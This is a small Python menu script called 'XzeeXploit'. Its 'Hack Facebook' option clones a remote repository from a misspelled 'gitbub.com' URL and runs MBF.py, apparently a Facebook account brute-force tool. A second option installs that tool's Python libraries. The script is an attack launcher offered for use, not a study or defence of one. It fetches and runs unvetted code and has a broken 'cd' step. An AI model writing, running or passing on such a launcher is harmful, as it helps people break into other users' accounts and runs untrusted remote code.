import os
os.system("clear")
def banner():
       print("""
       ############
        XzeeXploit
       ############
       """)

def main():
       os.system("clear")
       banner()
       print("1.Hack Facebook")
       print("2.Install bahan")
       print("0.Exit")
       pilih = input("Pilih Nomor: ")                                                               
       if pilih == "1":
             os.system("git clone https://gitbub.com/Tegar-ID/MBF")                                 
             os.system("cd MBF")
             os.system("python2 MBF.py")
       elif pilih == "2":
             os.system("pip2 install requests")
             os.system("pip2 install mechanize")
       elif pilih == "0":
             exit()

main()
